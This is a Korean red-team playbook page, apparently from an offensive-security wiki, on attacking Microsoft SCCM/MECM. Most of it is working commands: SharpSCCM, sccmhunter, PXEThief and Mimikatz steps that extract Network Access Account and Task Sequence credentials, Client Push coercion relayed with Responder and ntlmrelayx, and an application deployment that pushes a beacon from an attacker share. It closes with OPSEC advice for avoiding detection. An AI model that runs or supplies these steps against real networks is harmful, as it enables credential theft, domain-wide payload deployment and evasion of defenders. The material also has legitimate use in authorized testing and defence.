# SCCM / MECM 공격

Microsoft Configuration Manager (구 SCCM, 현 MECM) 는 대규모 엔드포인트 관리 솔루션으로,
대부분의 엔터프라이즈에 깔려 있고 **고권한 계정**(Network Access Account, Site System Installation Account, Client Push Account 등) 을 광범위하게 사용한다.
한 번 침해되면 도메인 내 거의 모든 워크스테이션/서버에 페이로드를 푸시할 수 있어 RT 의 1순위 타겟.

> 보조 자격증명 획득 후 흐름은 [DACL Abuse](dacl-abuse.md), [횡적 이동](../lifecycle/lateral-movement.md), [자격 증명 탈취](../lifecycle/credential-access.md) 참고.

---

## 구성 요소

| 요소 | 설명 |
|------|------|
| **Site Server** | SMS Provider, Site Database 호스팅. 핵심 서버 |
| **Site Database (MSSQL)** | 정책/자산/자격증명 메타데이터 저장 |
| **MP (Management Point)** | 클라이언트 ↔ 사이트 통신. HTTP(S) 노출 |
| **DP (Distribution Point)** | 패키지/스크립트 배포 |
| **CMG (Cloud Management Gateway)** | Azure 기반 외부 클라이언트 게이트웨이 |
| **NAA (Network Access Account)** | 클라이언트가 콘텐츠 다운로드 시 사용 - 도메인 계정인 경우가 많음 |

---

## 발견 / 식별

```bash
# 도메인 내 SCCM 사이트 서버 / MP / DP 식별
# System Management 컨테이너에 등록되어 있음
nxc ldap <dc_ip> -u <user> -p '<pass>' -M sccm

# LDAP 직접 쿼리
ldapsearch -x -H ldap://<dc_ip> -D '<user>@<domain>' -w '<pass>' \
  -b "CN=System Management,CN=System,DC=<domain>,DC=<tld>" '(objectClass=mSSMSManagementPoint)'

# SharpSCCM (Windows)
SharpSCCM.exe local site-info
SharpSCCM.exe get site-info

# Maluable / sccmhunter
sccmhunter find -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip>
sccmhunter mp -u <user> -p '<pass>' -d <domain> -sc <site_code> -tu <username>
```

엔드포인트에서 자체 식별:

```powershell
Get-WmiObject -Namespace root\ccm -Class SMS_Authority | Select Name,CurrentManagementPoint
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\CCM' | Select SMSSLP,SiteCode
```

---

## 1) NAA / Task Sequence 자격증명 탈취

가장 흔하고 영향이 큰 공격. 도메인 내 일반 사용자/디바이스 권한만으로도 **NAA 평문 자격증명** 획득 가능.

### 클라이언트에 SCCM 에이전트가 설치된 호스트에서 (로컬 관리자 권한)

```powershell
# WMI 에서 정책 다운로드 → DPAPI 로 NAA 복호화
SharpSCCM.exe local secrets -m disk      # CIM repository
SharpSCCM.exe local secrets -m wmi       # WMI 기반

# Mimikatz
misc::sccm
```

### 비인증/원격 (PXE 부팅 환경)

```bash
# PXE 부팅 변수 추출 → BootMedia 패스워드 우회 → Task Sequence 환경 변수에서 NAA 추출
# Microsoft 가 PXE password 를 약하게 보호 → 크래킹 가능
PXEThief / pxethief.py inspect <pxe_server_ip>
PXEThief / pxethief.py exploit <pxe_server_ip> --output ts.xml
```

### MP 직접 정책 요청 (sccmhunter)

```bash
# 새 가짜 디바이스 등록 → 정책 다운로드 → NAA 추출 (자동화)
sccmhunter mp -u <user> -p '<pass>' -d <domain> -sc <site_code> \
  -tu <fake_device> --register --policy-decryption
```

---

## 2) Client Push Installation Account Coercion (CVE-2022-37972 등)

`Client Push Installation` 이 활성화되어 있으면 SCCM 이 새 호스트에 에이전트를 설치하기 위해 **Client Push Account 자격증명**을 보낸다. 이를 NTLM 으로 캡처/릴레이.

```bash
# Client Push 활성화 여부
sccmhunter smb -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip>
SharpSCCM.exe get class-instances SMS_SCI_ClientComp -p AutomaticClientPush

# 1) 우리 호스트를 신규 디바이스로 등록 (사이트 서버가 인증 시도하도록 유도)
SharpSCCM.exe invoke client-push -t <attacker_ip>

# 2) Responder/ntlmrelayx 로 캡처
sudo responder -I <iface> -wd
impacket-ntlmrelayx -t ldap://<dc_ip> --escalate-user <attacker_user>
```

캡처된 자격증명은 종종 **로컬 관리자 권한이 광범위하게 부여**되어 있음 → 즉시 PtH 로 횡적 이동.

---

## 3) Site Takeover

### Application Deployment 로 페이로드 푸시 (Full Admin / Application Author)

```bash
SharpSCCM.exe new application -n RT_Update -p '\\<attacker>\share\beacon.exe'
SharpSCCM.exe new deployment -a RT_Update -c <collection_id>
SharpSCCM.exe exec -d <device> -p 'powershell -enc ...'

# Python: cmexec
cmexec.py -u <user> -p '<pass>' -t <site_server> --device <target> --command 'whoami'
```

### Site Database 직접 쿼리 (DB 접근 가능 시)

```sql
-- NAA / Task Sequence 자격증명은 DB 에 저장됨 (DPAPI 로 사이트 서버 머신키로 보호)
USE CM_<SiteCode>;
SELECT * FROM vSMS_SC_ClientConfig;
SELECT * FROM Secrets;
SELECT * FROM TS_Sequence;
```

DPAPI 키는 사이트 서버에서 추출:

```text
# 사이트 서버 SYSTEM 권한
mimikatz # privilege::debug
mimikatz # !sekurlsa::dpapi
mimikatz # dpapi::cred /in:<encrypted_blob>
```

---

## 4) CMG / 외부 노출

CMG 는 인터넷에서 SCCM 클라이언트를 관리하기 위해 Azure 에 배포. 잘못 구성되면 외부에서도 정책/디바이스 등록이 가능.

```bash
# CMG 엔드포인트 식별 (인증서/도메인)
crt.sh "%.cmg.<company>.com"
sccmhunter cmg -t https://CMG.contoso.com

# 클라이언트 인증서 위조 → 디바이스 등록 → NAA 정책 요청
```

---

## 자주 쓰는 명령 모음

```bash
# 사이트 정보
SharpSCCM.exe get site-info
SharpSCCM.exe get site-push-settings

# 디바이스/사용자/컬렉션
SharpSCCM.exe get devices -d <name>
SharpSCCM.exe get users
SharpSCCM.exe get collections
SharpSCCM.exe get primary-users -d <device>

# 응용 프로그램 / 배포
SharpSCCM.exe get applications
SharpSCCM.exe get deployments

# 로컬 캐시/시크릿
SharpSCCM.exe local secrets
SharpSCCM.exe local triage      # 엔드포인트 스캔
```

---

## OPSEC

- `Application Deployment` 푸시는 **사이트 서버 → 타겟** 로그가 명확히 남음. 평소 운영 시간대를 흉내내고 정상 명명 규칙(예: `SUS_KB_<id>`) 사용
- `Client Push` 캡처는 사이트 서버에서 **반복적인 인증 실패 로그** 를 만든다 - 가능하면 1회만 트리거
- NAA 추출은 클라이언트 측 WMI/CIM 만 건드리므로 비교적 조용함
- PXEThief 사용 시 PXE 부팅 트래픽이 네트워크 세그먼트에 노출

---

## 탐지 / 방어 측 참고 (RT 가 알아두면 회피에 유리)

| 행위 | 가시성 |
|------|--------|
| NAA 정책 요청 | MP IIS 로그 (`/CCM_System/`), 신규 디바이스 등록 이벤트 |
| Client Push 자격증명 트리거 | 사이트 서버의 `ccm.log`, `client.msi.log` |
| Application Deployment | `appenforce.log` (클라이언트), `distmgr.log` |
| DB 직접 접근 | MSSQL Audit, `SiteServer` SQL 사용자 비정상 쿼리 |

---

## 도구

- [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)
- [sccmhunter](https://github.com/garrettfoster13/sccmhunter)
- [pxethief](https://github.com/MWR-CyberSec/PXEThief)
- [Mimikatz `misc::sccm`](https://github.com/gentilkiwi/mimikatz)
- [Misconfiguration Manager (TTPs/방어 매핑)](https://github.com/subat0mik/Misconfiguration-Manager)
